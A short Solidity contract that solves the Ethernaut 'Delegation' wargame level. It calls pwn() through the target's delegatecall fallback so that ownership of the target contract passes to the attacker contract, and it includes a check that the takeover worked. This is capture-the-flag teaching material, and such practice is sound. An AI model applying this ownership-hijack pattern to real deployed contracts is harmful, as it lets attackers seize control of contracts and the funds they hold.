//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IDelegation {
    function owner() external view returns (address);
}

contract DelegationExploit {
    IDelegation public implementation;
    address public owner;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Delegation` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0xF781b45d11A37c51aabBa1197B61e6397aDf1f78
    constructor(IDelegation _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    /// @notice Exploits `Delegation` contract by trigerring it's `fallback` function with the function
    /// @notice signature of the function in the `Delegate` contract
    function exploit() external {
        require(msg.sender == owner, "not owner");

        (bool result, ) = address(implementation).call(
            abi.encodeWithSignature("pwn()")
        );

        require(result, "call to pwn() failed");
    }

    /// @notice Returns a boolean wheter the `implementation` contract has been exploited
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete = implementation.owner() == address(this);
    }
}
